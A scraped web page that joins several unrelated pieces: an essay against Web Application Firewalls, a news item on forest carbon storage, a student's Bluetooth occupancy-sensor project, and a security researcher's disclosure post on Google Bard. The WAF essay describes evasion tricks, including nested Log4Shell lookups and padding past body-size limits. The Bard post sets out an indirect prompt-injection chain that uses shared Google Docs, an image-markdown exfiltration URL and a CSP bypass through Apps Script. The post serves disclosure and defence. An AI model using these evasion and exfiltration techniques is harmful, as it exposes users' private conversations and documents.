        <p>I wanted to write this because I don't hear enough real people discouraging the use of Web Application Firewalls (WAFs). Probably because the search results for "Web Application Firewall" are all written by WAF vendors. Anyone reading just that could conclude that WAFs are a good idea. I'm here to offer another perspective, after having suffered through using a WAF for two years.</p>
<p>Web Application Firewalls were created early in the Internet's history, especially popularized by the <a href="https://en.wikipedia.org/wiki/ModSecurity">ModSecurity project in 2002</a>. WAFs essentially work by intercepting every single HTTP request (and sometimes responses too) and evaluating several hundred regular expressions over the URI, headers, and body, sometimes aided by machine learning. If the request kinda looks like SQL, shell code, etc., the server may block your request.</p>
<p>In the infancy of the cybersecurity field, WAFs seemed like a good idea. HTTP requests were tiny, infrequent, and mostly contained mundane form data. But today, WAFs have overstayed their welcome in the security toolbelt. There are better techniques you can use that make even the most advanced WAFs entirely obsolete.</p>
<h2 id="wafs-have-horrible-performance">WAFs have Horrible Performance</h2>
<p>Since WAFs run hundreds of regular expressions on every request, you may ask, "isn't that super inefficient?" Yes, very.</p>

<p>In addition to slowing down every request, you also need significant additional RAM for buffering requests. Since not a single byte in the buffer can be flushed to the backend server until the WAF completes its analysis, you need several gigabytes of RAM to store request bodies. Servers like nginx buffer requests by default, but enough large concurrent requests (like pushing a container image) can make a buffering web server run out of RAM. When using a WAF, every server becomes a buffering web server, which is simply incompatible with many types of applications.</p>
<p>I know computers are fast and hardware is cheap, but we shouldn't be spending that kind of CPU and RAM on WAFs unless they're a really effective security tool. But they aren't, as you'll see next.</p>
<h2 id="wafs-are-easily-bypassed">WAFs are Easily Bypassed</h2>
<p>WAF vendors and attackers are locked in a constant arms race, but it seems <a href="https://github.com/0xInfection/Awesome-WAF#evasion-techniques">attackers are much better armed</a>. How could they not be? Many of the attacks that a WAF purports to block involve complex grammars like SQL, shell code, and entire programming languages. They often include comments, character escaping, encoding issues, and more oddities. These oddities mean that attackers always have a significant advantage and can typically bypass any WAF rule if they are clever enough.</p>
<p>For example, you might think <a href="https://en.wikipedia.org/wiki/Log4Shell">Log4shell</a> is pretty easy to catch: just check for <code>${jndi</code>, right? Unfortunately, Log4J supports nested "<a href="https://logging.apache.org/log4j/2.x/manual/lookups.html">lookups</a>", including ones that convert letters to upper/lower case like <code>${lower:J}</code></p>
<p>That means an attacker can insert an arbitrary number of nested lookups around each letter and still perform the attack, like this: <code>${${lower:J}ndi:...</code>. This lead CloudFlare to say <a href="https://blog.cloudflare.com/exploitation-of-cve-2021-44228-before-public-disclosure-and-evolution-of-waf-evasion-patterns/">"WAF vendors need to be looking at any occurrence of <code>${</code> and treating it as suspicious"</a>, which is just another hilarious example of how WAFs can never live up to the expectations placed on them.</p>
<p>I just discussed the fairly simple grammar that is Log4J Lookups, but you can imagine how many more evasion tactics you could use in a language as complex as SQL or PHP, especially when considering encoding tricks. For an in-depth description of specific WAF bypass techniques, check out <a href="https://habr.com/en/companies/dsec/articles/454592/">this awesome post</a>.</p>
<p>Another way to bypass a WAF involves just padding your attack string to appear <a href="https://docs.aws.amazon.com/waf/latest/developerguide/waf-oversize-request-components.html">&gt;8KB or so</a> into the request body. Like I mentioned in the section on performance, request bodies must be buffered into RAM for analysis, so WAFs must choose some cut-off point to avoid spending infinite CPU and RAM on a single request. For some WAFs like AWS's, that cutoff point is around 8KB. So if you just put 8192 innocuous characters before your Log4Shell attack string, you've rendered the WAF worthless.</p>
<h2 id="wafs-are-an-attack-vector">WAFs are an Attack Vector</h2>
<p>In 2019, CapitalOne experienced a breach of 100 million credit applications that was <a href="https://krebsonsecurity.com/2019/08/what-we-can-learn-from-the-capital-one-hack/">allegedly caused by a WAF misconfiguration</a>. The attacker allegedly tricked the WAF into sending requests to the EC2 Metadata Service, which handed out a credential that allowed reading sensitive files from S3.</p>
<p>While this is just one example, it illustrates the curious fact that WAFs actually have a large attack surface.</p>
<p>Most WAFs are giant, complex codebases that are usually closed-source and written in memory-unsafe languages. Since they're expensive "enterprise" products, companies stuff them full of unnecessary features to make them stand out more than competitors. All of this adds up to make WAFs yet another example of a dangerous "security" tool, <a href="https://www.macchaffee.com/blog/2023/solarwinds-hack-lessons-learned/">just like SolarWinds</a>.</p>
<p>No security officer would approve taking such a risky piece of software, putting it directly on the internet, making it parse mountains of untrusted input, and giving it access to all your backend servers, logging infra, SIEM, alerting systems, <a href="https://docs.fastly.com/en/ngwaf/jira">and even JIRA for some reason</a> UNLESS it's covered in security buzzwords and costs 5-6 figures per year.</p>
<p>Somehow, companies that sell security products have gotten a pass on implementing foundational security principles like secure by default, secure by design, attack surface reduction, and the principle of least privilege. Don't let them keep getting away with that.</p>
<h2 id="wafs-have-a-high-false-positive-rate">WAFs have a High False Positive Rate</h2>
<p>Over the last twenty years, open-source WAF rulesets have expanded considerably to detect more-recent types of attack. Apparently all those proprietary WAFs are doing the same. That means there are more and more possible strings that could trigger a WAF to block your request. If you want to write a comment on an article discussing Log4shell, you might be blocked for including the string <code>${jndi</code> in your comment. So naturally the false positive rate continues to rise with every new rule, and it's already quite high based on my experience maintaining a giant list of ModSecurity rule exceptions.</p>
<p>So-called "next-generation" WAFs claim to solve this problem by <a href="https://docs.fastly.com/en/ngwaf/about-next-gen-waf">looking at multiple requests</a> or by using <a href="https://docs.fastly.com/en/ngwaf/about-the-architecture#about-the-collection-and-analysis-system">IP reputation systems</a>. While these can improve false positive rates, they can never truly solve the problem. In some ways, less false positives can increase the impact of particular false positives since neither users nor support teams have a clear procedure for fixing it. CloudFlare's algorithm can randomly decide to block you and <a href="https://www.ctrl.blog/entry/cloudflare-ip-blockade.html">you will have no recourse</a>. Imagine that happening to someone less tech-savvy.</p>
<p>This is the classic problem with using an outdated security tool like a WAF: defenders have to configure the tool absolutely perfectly to be safe and avoid false positives, but attackers just need to find a single weakness. Those are horrible odds. You should use alternatives that don't require perfection from imperfect humans.</p>
<h2 id="alternatives-to-wafs">Alternatives to WAFs</h2>
<p>Since WAFs are resource-hungry, inneffective, unsafe, and noisy, how do I convince an auditor to not make me use one? The technical term would be to use "compensating controls", but that sounds like such a weak term to describe the powerful and simple alternatives to WAFs I'm about to describe:</p>
<ul>
<li><strong>Isolation:</strong> Isolation involves ensuring that a breach in one component can not affect the rest of the system, and there are many technologies that provide isolation.
<ul>
<li>Browsers do this by executing all code inside special sandboxed processes that don't have carte blanch access to cookies, saved passwords, other tabs, etc. Imagine how slow the web would be if every piece of JavaScript needed to be analyzed by hundreds of regexes before being executed!</li>
<li>Microservices are designed with isolation in mind, but you can also do it in a monolith with a variety of <a href="https://github.com/dckc/awesome-ocap#libraries-and-frameworks">libraries and languages</a>.</li>
</ul>
</li>
<li><strong>Immutability:</strong> Entire classes of attack can be eliminated by removing a few assumptions, like having a <a href="https://kubernetes.io/docs/tasks/configure-pod-container/security-context/">readOnlyRootFilesystem</a>, a <a href="https://thenewstack.io/3-immutable-operating-systems-bottlerocket-flatcar-and-talos-linux/">package manager that requires rebooting</a>, or append-only/<a href="https://www.rsync.net/resources/faq.html#9a">immutable backups</a>.</li>
<li><strong>Static Analysis:</strong> SQL injection has a miracle cure called "prepared statements". The problem is that devs forget to use them. Static analysis checks in a CI pipeline can all but ensure that zero SQL injection vulnerabilities are in your codebase, at which point there is no need for any SQL injection WAF rules. No, "defense in depth" is not a valid excuse to use a WAF anyway, because it provides no real defense! Like surrounding Fort Knox with an army of guard guinea pigs.</li>
<li><strong>Capability-based security:</strong> Not every API endpoint needs to have unrestricted read/write access to your entire database and file system, but that is the normal way people build APIs today. By using capabilities, you can express exactly that "GET /api/v1/books" only needs read access to the "books" table. Or that "POST /api/v1/imageupload" needs write access to a specific folder, but doesn't need the ability to spawn processes.</li>
</ul>
<p>Now I'll admit these ideas are quite broad; you'll need to adapt them to your particular app. WAF vendors offer a one-WAF-fits-all fantasy that I can't match. But these secure-by-design strategies are the way that the security industry needs to be heading. Unfortunately, it's a lot harder for the security industry to profit off of design-based techniques, so don't hold your breath.</p>

<p>To slow the effects of climate change, conserve biodiversity, and meet the sustainable development goals, replanting trees is vital. Restored forests store carbon within the forest's soil, shrubs, and trees. Mixed forests are especially effective at carbon storage, as different species with complementary traits can increase overall carbon storage.

										  
											        </p>
										 
										 											  
<p>Compared to single-species forests, mixed forests are also more resilient to pests, diseases, and climatic disturbances, which increases their long-term <a href="https://phys.org/tags/carbon+storage/" rel="tag">carbon storage</a> potential. The delivery of other ecosystem services is also greater in mixed species forests, and they support higher levels of biodiversity.
</p><p>Although the benefits of diverse forest systems are well known, many countries' restoration commitments are focused on establishing monoculture plantations. Given this practice, an international team of scientists has compared <a href="https://phys.org/tags/carbon+stocks/" rel="tag">carbon stocks</a> in mixed planted forests to <a href="https://phys.org/tags/carbon/" rel="tag">carbon</a> stocks in commercial and best-performing monocultures, as well as the average of monocultures.
</p><p>Their work is published in <i>Frontiers in Forests and Global Change</i>.
</p><p>"Diverse planted forests store more carbon than monocultures—upwards of 70%," said Dr. Emily Warner, a postdoctoral researcher in ecology and biodiversity science at the Department of Biology, University of Oxford, and first author of the study. "We also found the greatest increase in carbon storage relative to monocultures in four-species mixtures."
</p><h2>Species richness increases carbon storage potential</h2>
<p>The researchers analyzed studies published since 1975 that directly compared carbon storage in mixed and single-species forests, and combined this with previously unpublished data from a global network of tree diversity experiments. "We wanted to pull together and assess the existing evidence to determine whether forest diversification provides carbon storage benefits," Warner explained.
</p><p>The mixed planted forests assessed in the study ranged in <a href="https://phys.org/tags/species+richness/" rel="tag">species richness</a> from two to six species. In the data set the scientists worked with, four-species mixtures were the most effective carbon sinks. One such mix was made up from different broadleaf trees, which can be found across Europe. Mixes with two species also had greater above-ground carbon stocks than monocultures and stored up to 35% more carbon. Forests made up of six species, however, showed no clear advantage to monocultures.
</p><p>Accordingly, the researchers were able to show that diversification of forests enhances carbon storage. Altogether, above-ground carbon stocks in mixed forests were 70% higher than in the average monoculture. The researchers also found that mixed forests had 77% higher carbon stocks than commercial monocultures, made up of species bred to be particularly high yielding.
</p><h2>Forests for the future</h2>
<p>"As momentum for <a href="https://phys.org/tags/tree+planting/" rel="tag">tree planting</a> grows, our study highlights that mixed species plantations would increase carbon storage alongside other benefits of diversifying planted forests," said Dr. Susan Cook-Patton, a senior forest restoration scientist at The Nature Conservancy and collaborator on the study. The results are particularly relevant to forest managers, showing that there is a productivity incentive for diversifying new planted forests, the researchers pointed out.
</p><p>While showing the increased potential of mixed forests to store more carbon, the researchers cautioned that their study is not without limitations, including the overall limited availability of studies addressing mixed vs. monoculture forests, particularly studies from older forests and with higher levels of tree diversity.
</p><p>"This study demonstrates the potential of diversification of planted forests, and also the need for long-term <a href="https://phys.org/tags/experimental+data/" rel="tag">experimental data</a> to explore the mechanisms behind our results," Warner said. "There is an urgent need to explore further how the carbon <a href="https://phys.org/tags/storage/" rel="tag">storage</a> benefits of diversification change depending on factors such as location, <a href="https://phys.org/tags/species/" rel="tag">species</a> used and <a href="https://phys.org/tags/forest/" rel="tag">forest</a> age."

    <article>
        

        

        <section>
            <p>Have you ever wanted to design a full end-to-end software solution to collect occupancy data across a college campus?</p>
<p>I didn't think I would either, but here we are.</p>
<h2 id="the-inspiration">The inspiration</h2>
<p>During my first year in college, we had Sodexo as our dining provider. They had a contract with <a href="https://www.bluefox.io/products/count">Bluefox</a>, who provides occupancy sensors to report the number of people within a dining hall. I'd like to think they used this data to improve dining hall operations. I couldn't tell you what they <em>actually</em> used it for. I can say that after some FOIA requests a friend made that returned PDF's with awful kerning, these devices work by counting smartphone MAC addresses from Bluetooth advertising packets. This was a pretty cool way for me to avoid crowds in the dining hall - toss the API call into Grafana, and you have a live chart of how busy the dining halls are.</p>
<h2 id="the-downfall">The downfall</h2>
<p>Unfortunately, the university switched dining hall providers to Aramark. Aramark does not contract Bluefox to provide the same occupancy counts, which meant no more occupancy data, which meant no more skipping busy hours.</p>
<h2 id="the-climb-back">The climb back</h2>
<p>The idea of tracking occupancy metrics with a bluetooth beacon was stuck in my head. What design decisions and considerations would you need to make?</p>
<ul>
<li>How accurate is BLE beacon count, as a proxy for occupancy?
<ul>
<li>Some people carry around headphones, smartwatches, etc - but some don't carry any devices at all (or keep Bluetooth off on their phone).</li>
</ul>
</li>
<li>How accurate is BLE beacon availability time, as a proxy for dwell time?
<ul>
<li>Can we use unique MAC addresses' churn to detect this?</li>
<li>Is the built-in MAC address randomization that is common across <a href="https://source.android.com/docs/core/connect/wifi-mac-randomization-behavior">many</a> different <a href="https://support.apple.com/guide/security/bluetooth-security-sec82597d97e/web#sec18ee64d9d">manufacturers</a> going to impact this? (Even though this privacy feature has <a href="https://ieeexplore.ieee.org/document/9369628">flaws</a>)</li>
</ul>
</li>
<li>How can we communicate the results back to a central server?
<ul>
<li>WiFi seems the obvious choice for me. Not every location will have easy-to-access WiFi, though.</li>
<li>LoRa could be an option, depending on the distribution of beacons. Here's some <a href="https://medium.com/home-wireless/what-is-the-range-of-a-lora-radio-411261e35f46">range testing numbers</a>, though this is affected by the antenna's gain and locations (here's <a href="https://yosensi.io/posts/what_is_the_real_range_of_lora/">another test</a> with a far higher range).</li>
</ul>
</li>
<li>How can we collect the data?
<ul>
<li>Should we use a time series database?</li>
</ul>
</li>
<li>How can we analyze the data?
<ul>
<li>Can we predict trends in the longer time spans, excluding special events like homecoming weekend, finals week, etc?</li>
</ul>
</li>
</ul>
<div><p>I found these questions tumbling around in my head, so I began with some preliminary testing - writing some simple code to count the number of devices detected on my laptop's Bluetooth adapter. Success - it was surprisingly easy to write code to scan for <code>x</code> seconds every <code>y</code> seconds and save it to a SQLite database at regular intervals. So, I carried my laptop to dining halls, Chick-Fil-A, Starbucks, etc and waited.
</p><p>


And waited.
</p><p>



And waited.
</p><p>







I spent a lot of time collecting data while sipping on coffees and milkshakes. You know, for data collection purposes. This is all very academic, of course.
</p><p>

​No other reason.
</p><p>

​Anyway, accuracy - In smaller areas (like a single-room Starbucks), I found the count to be pretty accurate. At the very least it reflected trends in occupancy very quickly. When more people arrived, the charts quickly climbed. </p></div>
<p>In larger areas like dining halls, the counts seemed accurate by my guesstimate. There's no way for me to count everyone in a dining hall, with complicated layouts and different seating areas, especially when I'm not certain of my bluetooth adapter's range (is it picking up people on the terrace through the walls? etc). But it most definitely matched the trends around class changes - when classes got out, people went to eat, which rapidly increased the number of people I saw, and the number of beacons my laptop detected.</p>
<h2 id="long-term-deployment">Long term deployment</h2>
<p>Okay, sounds great, it looks like we have some kind of method validation. But I don't plan on cloning myself in every dining hall and sitting 24/7, so what can we do to create a small device to collect the same data?</p>
<h2 id="raspberry-pi-maybe">Raspberry Pi - Maybe?</h2>
<p>My first thought was - Raspberry Pi Zero W. It's small and cheap, has Wi-Fi and Bluetooth, and definitely is in stock somewhere on Earth. </p>
<p>I rewrote my simple code (in Rust, no less!) to handle everything gracefully (reboots, no network, adapter loss, etc). Linux Bluetooth is incredibly painful to handle in a headless way. Binding to DBus requires cross-compiler magic and not even Cross was getting me out of it. After struggling enough through a million different compiler flags, a power outage that caused me to lose my progress on the Makefile (also, yes I use Make with Rust), and at last setting up a QEMU bridge, I was able to get my binary to run on my Pi. I even wrote all of the patching magic to make it connect to Wi-Fi (try doing THAT headlessly, when there's a portal you have to sign into!), install the necessary libraries on start-up, make a service to run my executable, and automagically update when I push a new update. Okay, that's a lot of moving parts. Let's boot it up and hope it works...</p>
<p><strong>Nothing.</strong></p>
<p>That's right, absolutely nothing worked. Not even the automagic wifi connection via Mac address fiddling hacks. </p>
<h2 id="moving-on">Moving on</h2>
<p>If you're smarter than me, you may have realized that's <del>a bit</del> WAY too much complexity. We really do not need a whole Linux kernel at all. We need two things - reliable Wi-Fi, and reliable Bluetooth. Okay, so shelve the Pi Zero W and Orange Pi Zero W I bought. What's this nonsense about a device that can do these two things at an even cheaper price and smaller footprint?...</p>
<h2 id="esp32"><strong>ESP32</strong>?</h2>
<p><img src="https://matthew.science/imgs/occupancy/esp32c3.png" alt="ESP32C3"></p>
<p>On paper, it looks great - Wi-Fi, Bluetooth, extremely low power usage (🌱🌍♻️🌿🌞💚), very cheap, and very tiny.</p>
<p>I purchased one off of Amazon since I didn't want to wait for overseas shipping (not losing momentum in a nerd snipe like this is <strong>CRITICAL</strong>). I bought a random <a href="https://www.amazon.com/dp/B072HBW53G">ESP32-WROOM-32 with an OLED display</a>, since I thought it would be cool to display the data on the screen live. I rewrote my data collection code in C++ form (away from Rust!) since the Rust ecosystem for ESP32 is not all the way there yet.</p>
<p>After fidgeting with the display code enough to get it working (<code>SSD1306Wire display(0x3c, 5, 4);</code> if you're wondering), it worked great. I asked campus IT to whitelist the MAC address, wrote up some Cloudflare functions into a D1 database as my data ingest, and set out to work.</p>
<h2 id="deployment">Deployment</h2>
<p>I <del>hid</del> placed my data collection device in my campus library on a crisp fall morning, sat myself down at my laptop, saw the data rolling in, and did a silent celebration. Off to my Principles class to learn about scope rules then...</p>
<figure>
  <img src="https://matthew.science/imgs/occupancy/chartfall.png" alt="A picture showing my chart rapidly falling as it peaks">
  <figcaption>Why did everyone leave Swem library and never come back???</figcaption>
</figure>
<h3 id="obstacles">Obstacles</h3>
<p>One major problem that I ran into was the poor specs of the random ESP32 device I had. </p>
<p>The above issue shows the device crashing at about 250 devices. At first, I was worried this was a bug with the result count being stored in a 1-byte number, like a u8 (thus capping at ~255 devices). A quick <code>Serial.print</code> made me realize it would crash also at about 249, 265, etc - randomly around this area. So, not a bit-overflow issue (at least, not in the integer part!).</p>
<p>Our library fills up quickly with studious twamps - it wouldn't last a minute in finals season if it couldn't handle any more than that. </p>
<h3 id="the-problem-identified">The problem - identified</h3>
<p>By saving the results during a scan into a data structure until the end of the scan, it piled up data about the device's scan strength, advertised services, manufacturer ID, etc. While this seems like great data to collect, I had one thing in mind - the number of unique devices (for now). </p>
<p>By debugging the heap size constantly, I realized that the scan results was filling up the small amount of RAM it had. This was bad news - at first, I didn't see a way to still collect the data while not actually collecting the data.</p>
<h3 id="resolution">Resolution</h3>
<p>I decided to brush up on my C++ data structures programming and write a small hashset. After all, the data structure for the scan results was very bloated - if I could override that, I would be able to control the heap size more closely, right?</p>
<p>On every callback, then, we'd insert the MAC address into a hashset, then clear the built-in result structure to allow for more memory.</p>
<p><img src="https://matthew.science/imgs/occupancy/code.png" alt="Code"></p>
<p>Unfortunately, this is not ideal - <strong>if and only if</strong> there's some results to check for duplicates, the callback is only called on new devices. When we clear this every time, we give it amnesia, thus every single BLE advertisement packet causes a callback. We <em>do</em> check for duplicates in <code>addToSet</code> (it is a hashset!), but this will definitely cause hundreds of duplicate callbacks to our hashset, <em>and</em> heap thrashing since we're allocating and deallocating the result structure every single callback. That's okay (for now), it's better to repeatedly check a hashmap with no more than 1000 entries (a very quick procedure) very often, than have our capacity limited to 250 people. </p>
<h3 id="more-obstacles">More obstacles</h3>
<p>Okay, we now have a perfect way to scan for devices for long periods of time. Oh would you look at the calendar - it's fall break! I'll leave it in the library and have it report back so I can see how packed it is over break (yes, there will be studying done on campus over break - we are a nerdy college). Perfect, even some long-term testing over the 5 day weekend! Surely nothing bad will happ-</p>
<figure>
  <img src="https://matthew.science/imgs/occupancy/fallbreak.png" alt="A picture showing my chart rapidly falling again">
  <figcaption>That's about 400 devices before the crash - on a fall break day in a college. As mentioned - nerdy.</figcaption>
</figure>
<p>Okay, awesome. Another issue, one that manifests itself after 3 hours of use with zero indication of issues. After fighting with the debugger for long enough, and even tossing in periodic reboots (it boots very quick so this adds almost no time at all), I chalked this up to a bad board/BT adapter - it seemed to run, but it instantly returned zero devices on every scan. That's okay - while I was messing with this Amazon one, I bought quite a few others, along with the rest I've bought over the course of the whole project.</p>
<figure>
  <img src="https://matthew.science/imgs/occupancy/devices.jpeg" alt="A picture showing several devices I've purchased over the course of this project">
  <figcaption>Seeed Studio XIAO ESP32S3/C3, WaveShare ESP32S3 Zero, Unbranded ESP32-WROOM with OLED, Orange Pi Zero W (untouched), Raspberry Pi Zero W (L-&gt;R, T-&gt;D)</figcaption>
</figure>
<p>After testing all of these, the only one reliable to work for long periods of time (one month currently) was the XIAO ESP32C3/S3. Both work acceptably, but I decided to go with the C3, since it's RISC-V, which is awesome (for my ideals), and since it's cheaper, which is also awesome (for my wallet).</p>
<p>Another benefit of switching to a better manufacturer is more SRAM - I was able to switch away from my hand-written hashmap implementation, since the RAM was able to hold the results data structure much better without crashing. I've seen as high as 1000 devices detected with no sign of slowing down. This probably reduces CPU usage as well - no more heap and callback churn!</p>
<p>After I found a device that worked far better, I moved my deployment location to my dorm room window so I would have an easier deployment cycle - here it is with numerous academic buildings in the background.</p>

<h2 id="final-data-collection">Final data collection</h2>
<p>Now that I've gotten my data collection working successfully, let's look at the data for one day.</p>
<figure>
  <img src="https://matthew.science/imgs/occupancy/chart.png" alt="A screenshot of a chart showing occupancy stats - it shows peaks at times where you'd expect there to be">
  <figcaption>Data collection for one day. Notice the peaks? That's right about the time that classes switch.</figcaption>
</figure>
<p>There's something to note about this. The device might be in my dorm, but it largely is not limited to the dorm's own inhabitants. Otherwise, it would be at its max in the early morning and drop as the day went on. If I wanted it to measure exclusively dorm inhabitants, I would probably place it more centrally (instead of out a window), but it still would not be great at this, since dorms are the <em>worst</em> at permeating bluetooth signals through many walls.</p>
<p>That's okay, I'll just keep that in mind as I analyze the data - it's mostly picking up students as they go into the two nearest academic buildings, not the dorm inhabitants. </p>
<p>The peaks start up around 7:50, right before the 8 am classes start in Ewell and Washington halls. I suspect this is detecting the students initially leaving dorms, shuffling along to their classes, and the drop is as students enter the buildings. Then, the peak at 8:50 is probably as students leave their 8 AMs and go to their 9 AMs, entering the range of the device only to immediately leave it as the numbers drop at 9 AM. Same for 9:50/10 AM, and 10:50/11 AM. These are all class switch times.</p>
<p>These all point to method validation - it seems like this device really is good at tracking trends in the movement of students around it. The antenna is also seemingly very high range - I didn't expect it to reach the ~160ft into Washington Hall, and the ~100ft into Ewell. The altitude of being on the 3rd floor probably helps with it, though.</p>
<h2 id="time-series-forecasting">Time series forecasting?</h2>
<p>This seems like the perfect target for time series forecasting, like with <a href="https://neuralprophet.com/">NeuralProphet</a>. The data is chock-full of hourly, daily, and weekly trends. I added the functionality to predict these trends and so far, it's very good at predicting daily trends; the longer (week, month, and season-long) trends will likely converge after enough data is collected.</p>
<h2 id="further-thoughts">Further thoughts</h2>
<p>Of course, this is not a solved project. I've written the code to parse this into a Cloudflare DB, into Grafana, and some forecasting, but there's more to be done. </p>
<p>I performed an enormous amount of literature review over the course of this project - reading dozens of research papers on the topic, finding out what works and what didn't, what I would try and what I would avoid. Many questions are raised in these papers, that I still want to answer.</p>
<figure>
  <img src="https://matthew.science/imgs/occupancy/papers.jpeg" alt="A photograph of a stack of research papers, annotated with sticky notes">
  <figcaption>Hours of doc review</figcaption>
</figure>
<p>For example, how well of a proxy is a BLE beacon count for actual population count? </p>
<ul>
<li>Does this depend on the demographics? How do we find a correction factor (like for <code>x</code> beacons, there's roughly <code>0.7x</code> people, given the multiple devices people carry around)? </li>
<li>For example, in the computer science building, is the linear rate to population higher, since we carry so many gadgets around? Or is it lower, because we know to turn off Bluetooth when not using it (BT firmware zero days, you see)? </li>
<li>Or in the staff building, is it lower compared to students, since they are less likely to carry around a bunch of tech?</li>
<li>Maybe the rate is lower in a dining hall, since not many people are using multiple devices like they would in a lecture hall (laptop, iPad, etc for notes)?</li>
</ul>
<p>Other questions came to mind, like:</p>
<ul>
<li>Can we improve the accuracy by setting an RSSI minimum, for which devices weaker than it do not count, to ensure only those who are really nearby get counted?</li>
<li>Can we improve the accuracy by filtering by manufacturer ID, so it's only Apple + common Android manufacturers? Would this help, since Apple Watches, AirPods, MacBooks, etc would all still add to the count?</li>
<li>What kinds of privacy accomodations do I need to keep in mind? I already only track pure beacon numbers. I don't track actual MAC addresses like Bluefox did, but do I need to add noise to the data? Is the existing data noisy enough to avoid deanonymization? Is it realistic to identify a single person in the data without anything but the number of devices?</li>
<li>What's the best scan duration? Too quick, and it won't find all of the hundreds of devices that exist. Too long, and we risk inaccuracy (counting devices that have since left, data showing large drifts within short periods of time, etc). 
<ul>
<li>Is a dynamic scan length best? (Think about cooking a bag of popcorn - when a period of time passes without any change, you're done)</li>
</ul>
</li>
</ul>
<p>Lots of questions to answer. I plan on validating my data with real-world population data collected in a place where it's easy to get the "ground truth". Maybe I will reach out to a place on campus who either already tracks occupancy (the gym with swipe in/out), or will investigate more thoroughly in a place where it is trivial to do so myself (limited entry/exit, like a dining hall, or a Starbucks).</p>
<h2 id="further-work">Further work</h2>
<p>I am not sure whether I will be taking this further - I'm currently talking to some professors about the use cases for some university committees, or perhaps further academic (and hopefully publish-worthy) research. I am also considering selling it to brick-and-mortar businesses that want to measure occupancy trends. It's a pretty packaged up solution - everything from the front-end to the back-end is built already. This is vaguely what the setup looks like for any given deployment:</p>
<ul>
<li>Set up Wi-Fi in config (either have network whitelist the MAC if it's a portal, or connect to open/password protected Wi-Fi on boot)</li>
<li>Change machine and site IDs in config</li>
<li>Plug device/devices into outlet in central/convenient locations</li>
<li>Set up Grafana dashboard to read each device from backend</li>
<li>Set up Grafana dashboard to read predicted trends as well, in separate charts</li>
</ul>
<p>If you're interested in any of this, please let me know! I'd love to hear from you.</p>

            <description><![CDATA[<p>URL: <a href="https://embracethered.com/blog/posts/2023/google-bard-data-exfiltration/">https://embracethered.com/blog/posts/2023/google-bard-data-exfiltration/</a>, See on <a href="https://news.ycombinator.com/item?id=38251957">Hacker News</a></p>
<div id="readability-page-1" class="page"><section>
    <p>Recently Google Bard got some <a href="https://blog.google/products/bard/google-bard-new-features-update-sept-2023/">powerful updates</a>, including Extensions. Extensions allow Bard to access YouTube, search for flights and hotels, and also to access a user’s personal documents and emails.</p>
<p><strong>So, Bard can now access and analyze your Drive, Docs and Gmail!</strong></p>
<p>This means that it analyzes untrusted data and will be susceptible to Indirect Prompt Injection.</p>
<p>I was able to quickly validate that Prompt Injection works by pointing Bard to some older YouTube videos I had put up and ask it to summarize, and I also tested with <code>Google Docs</code>.</p>
<p>Turns out that it followed the instructions:</p>
<p><a href="https://twitter.com/wunderwuzzi23/status/1704198612039737845"><img src="https://embracethered.com/blog/images/2023/google-bard-pi.png" alt="Google Bard Prompt Injection Demo"></a></p>
<p>At that point it was clear that things will become a lot more interesting.</p>
<p>A shout out to <a href="https://twitter.com/rez0__">Joseph Thacker</a> and <a href="https://twitter.com/KGreshake">Kai Greshake</a> for brainstorming and collaborating on this together.</p>
<h2 id="whats-next">What’s next?</h2>
<p>Indirect Prompt Injection attacks via Emails or Google Docs are interesting threats, because these can be delivered to users without their consent.</p>
<p><strong>Imagine an attacker force-sharing Google Docs with victims!</strong></p>
<p>When the victim searches or interacts with the attacker’s document using Bard the prompt injection can kick in!</p>
<p><strong>Scary stuff!</strong></p>
<p>A common vulnerability in LLM apps is chat history exfiltration via rendering of hyperlinks and images. The question was, how might this apply to Google Bard?</p>
<h2 id="the-vulnerability---image-markdown-injection">The Vulnerability - Image Markdown Injection</h2>
<p>When Google’s LLM returns text it can return markdown elements, which Bard will render as HTML! This includes the capability to render images.</p>
<p>Imagine the LLM returns the following text:</p>
<pre tabindex="0"><code>![Data Exfiltration in Progress](https://wuzzi.net/logo.png?goog=[DATA_EXFILTRATION])
</code></pre><p>This will be rendered as an HTML image tag with a <code>src</code> attribute pointing to the <code>attacker</code> server.</p>
<pre tabindex="0"><code>&lt;img src="https://wuzzi.net/logo.png?goog=[DATA_EXFILTRATION]"&gt;
</code></pre><p>The browser will automatically connect to the URL without user interaction to load the image.</p>
<p>Using the power of the LLM we can summarize or access previous data in the chat context and append it accordingly to the URL.</p>
<p><a href="https://embracethered.com/blog/images/2023/bard-exfil-logo.png"><img src="https://embracethered.com/blog/images/2023/bard-exfil-logo.png" alt="Google Bard Data Exfil"></a></p>
<p>When writing the exploit a prompt injection payload was quickly developed that would read the history of the conversation, and form a hyperlink that contained it.</p>
<p>However image rendering was blocked by Google’s Content Security Policy.</p>
<h2 id="content-security-policy-bypass">Content Security Policy Bypass</h2>
<p>To render images from an attacker controlled server there was an obstacle. Google has a Content Security Policy (CSP) that prevents loading images from arbitary locations.</p>
<p><a href="https://embracethered.com/blog/images/2023/bard-csp2.png"><img src="https://embracethered.com/blog/images/2023/bard-csp2.png" alt="CSP policy"></a></p>
<p>The CSP contains locations such as <code>*.google.com</code> and <code>*.googleusercontent.com</code>, which seemed quite broad.</p>
<p><strong>It seemed that there should be a bypass!</strong></p>
<p>After some research I learned about <code>Google Apps Script</code>, that seemed most promising.</p>
<p><code>Apps Scripts</code> are like Office Macros. And they can be invoked via a URL and run on the <code>script.google.com</code> (respectiveley <code>googleusercontent.com</code>) domains!!</p>
<p><img src="https://embracethered.com/blog/images/2023/google-bard-appscript.png" alt="appsscript bypass"></p>
<p>So, this seemed like a winner!</p>
<h2 id="writing-the-bard-logger">Writing the Bard Logger</h2>
<p>Equipped with that knowledge a “Bard Logger” in <code>Apps Script</code> was implemented.</p>
<p>The logger writes all query parameters appended to the invocation URL to a <code>Google Doc</code>, which is the exfiltration destination.</p>
<p><a href="https://embracethered.com/blog/images/2023/google-bard-logger.png"><img src="https://embracethered.com/blog/images/2023/google-bard-logger.png" alt="Bard Logger"></a></p>
<p>For a second it seemed like it’s not possible to expose such an endpoint anonymously, but after some clicking through the <code>Apps Script</code> UI I found a setting to make it have no authentication.</p>
<p>So, now all the pieces were ready:</p>
<ol>
<li>Google Bard is vulnerable to Indirect Prompt Injection via data from Extensions</li>
<li>There is vulnerabilty in Google Bard that allows rendering of images (zero click)</li>
<li>A malicious Google Doc Prompt Injection Instructions to exploit the vulnerability</li>
<li>A logging endpoint on <code>google.com</code> to receive the data when the image is loaded</li>
</ol>
<p>But, will it work?</p>
<h2 id="demo-and-responsible-disclosure">Demo and Responsible Disclosure</h2>
